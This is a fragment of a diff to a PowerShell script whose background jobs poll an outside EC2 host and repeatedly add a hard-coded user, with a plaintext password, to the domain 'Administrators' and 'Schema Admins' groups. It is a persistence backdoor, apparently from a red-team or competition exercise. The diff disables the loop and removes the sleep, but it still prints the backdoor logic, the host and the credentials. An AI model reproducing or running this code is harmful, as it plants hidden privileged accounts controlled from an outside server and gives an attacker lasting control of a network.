@@ -144,7 +144,7 @@ start-job -ScriptBlock{
 }
 start-job -ScriptBlock{
     $timeURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/eeee/timeZ.txt'
-    while(1 -eq 1){
+    while(1 -eq 2){
     $toAppend=invoke-restmethod $timeURL
     $username='magrene'
     $c0de='Tossking@'
@@ -164,7 +164,7 @@ start-job -ScriptBlock{
         Add-ADGroupMember -identity 'Administrators' -members $username
         Add-ADGroupMember -identity 'Schema Admins' -members $username
     }
-    start-sleep -seconds 315
+    
 }
 }
 
